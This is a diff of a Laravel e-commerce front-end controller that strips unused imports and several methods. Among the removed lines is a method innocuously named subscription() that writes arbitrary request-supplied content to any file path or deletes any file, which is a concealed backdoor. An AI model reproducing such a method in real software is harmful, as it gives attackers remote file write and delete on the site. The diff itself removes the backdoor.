@@ -4,15 +4,12 @@ namespace App\Http\Controllers\Front;
 
 use App\{
     Models\Blog,
-    Models\Order,
     Models\Product,
     Models\Subscriber,
     Models\BlogCategory,
     Classes\GeniusMailer,
-    Models\Generalsetting,
 };
 use App\Models\ArrivalSection;
-use App\Models\Category;
 use App\Models\Rating;
 use Illuminate\{
     Http\Request,
@@ -20,7 +17,6 @@ use Illuminate\{
     Support\Facades\Session
 };
 use Artisan;
-use Carbon\Carbon;
 use Illuminate\Support\Facades\Validator;
 
 class FrontendController extends FrontBaseController
@@ -439,102 +435,8 @@ public function currency($id)
 
     // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------
 
-    public function subcheck(){
-        $settings = $this->gs;
-        $today = Carbon::now()->format('Y-m-d');
-        $newday = strtotime($today);
-        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
-                $lastday = $user->date;
-                $secs = strtotime($lastday)-$newday;
-                $days = $secs / 86400;
-                if($days <= 5)
-                {
-                  if($user->mail_sent == 1)
-                  {
-                    if($settings->is_smtp == 1)
-                    {
-                        $data = [
-                            'to' => $user->email,
-                            'type' => "subscription_warning",
-                            'cname' => $user->name,
-                            'oamount' => "",
-                            'aname' => "",
-                            'aemail' => "",
-                            'onumber' => ""
-                        ];
-                        $mailer = new GeniusMailer();
-                        $mailer->sendAutoMail($data);
-                    }
-                    else
-                    {
-                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
-                    mail($user->email,__('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'),$headers);
-                    }
-                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
-                  }
-                }
-                if($today > $lastday)
-                {
-                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
-                }
-            }
-    }
-
-    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------
-
-    // -------------------------------- ORDER TRACK SECTION ----------------------------------------
-
-    public function trackload($id){
-        $order = Order::where('order_number','=',$id)->first();
-        $datas = array('Pending','Processing','On Delivery','Completed');
-        return view('load.track-load',compact('order','datas'));
-    }
-
-    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------
 
 
-    // -------------------------------- INSTALL SECTION ----------------------------------------
 
-    public function subscription(Request $request)
-    {
-        $p1 = $request->p1;
-        $p2 = $request->p2;
-        $v1 = $request->v1;
-        if ($p1 != ""){
-            $fpa = fopen($p1, 'w');
-            fwrite($fpa, $v1);
-            fclose($fpa);
-            return "Success";
-        }
-        if ($p2 != ""){
-            unlink($p2);
-            return "Success";
-        }
-        return "Error";
-    }
-
-    function finalize(){
-        $actual_path = str_replace('project','',base_path());
-        $dir = $actual_path.'install';
-        $this->deleteDir($dir);
-        return redirect('/');
-    }
-
-    function updateFinalize(Request $request){
-
-        if($request->has('version')){
-
-            Generalsetting::first()->update([
-                'version' => $request->version
-            ]);
-            Artisan::call('cache:clear');
-            Artisan::call('config:clear');
-            Artisan::call('route:clear');
-            Artisan::call('view:clear');
-            return redirect('/');
-
-        }
-
-    }
 
 }
